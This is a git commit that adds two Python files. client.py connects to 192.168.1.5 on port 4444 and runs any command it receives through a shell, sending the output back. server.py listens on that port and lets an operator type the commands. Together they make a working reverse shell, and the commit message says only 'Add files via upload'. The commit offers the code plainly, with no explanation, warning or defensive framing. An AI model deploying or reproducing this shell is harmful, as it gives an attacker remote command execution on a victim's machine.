6df564150416d3ec8d9f402fbd56c2c0e5f3c6ed
Grizzy529 <102862377+Grizzy529@users.noreply.github.com>
2022-12-29 21:53:58 +0530

    Add files via upload

---
+++ client.py
@@ -0,0 +1,26 @@
+import socket
+import subprocess
+
+# Set the IP and port of the server you want to connect to
+server_ip = '192.168.1.5'
+server_port = 4444
+
+# Create a socket and connect to the server
+s = socket.socket()
+s.connect((server_ip, server_port))
+
+# While the connection is active, send commands to the server and receive output
+while True:
+    # Receive the command from the server
+    command = s.recv(1024).decode()
+
+    # If the command is 'exit', close the connection
+    if command == 'exit':
+        break
+
+    # Otherwise, run the command and send the output back to the server
+    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE)
+    s.send(output.stdout)
+
+# Close the connection
+s.close()
---
+++ server.py
@@ -0,0 +1,34 @@
+import socket
+
+# Set the IP and port to listen on
+bind_ip = '192.168.1.5'
+bind_port = 4444
+
+# Create a socket and bind it to the specified IP and port
+s = socket.socket()
+s.bind((bind_ip, bind_port))
+
+# Start listening for incoming connections
+s.listen(1)
+print('Listening for incoming connections...')
+
+# Accept the incoming connection
+client, addr = s.accept()
+print(f'Connection from {addr[0]}:{addr[1]}')
+
+# While the connection is active, send commands to the client and receive output
+while True:
+    # Send a command to the client
+    command = input('Enter command: ')
+    client.send(command.encode())
+
+    # If the command is 'exit', close the connection
+    if command == 'exit':
+        break
+
+    # Otherwise, receive the output from the client
+    output = client.recv(1024).decode()
+    print(output)
+
+# Close the connection
+client.close()
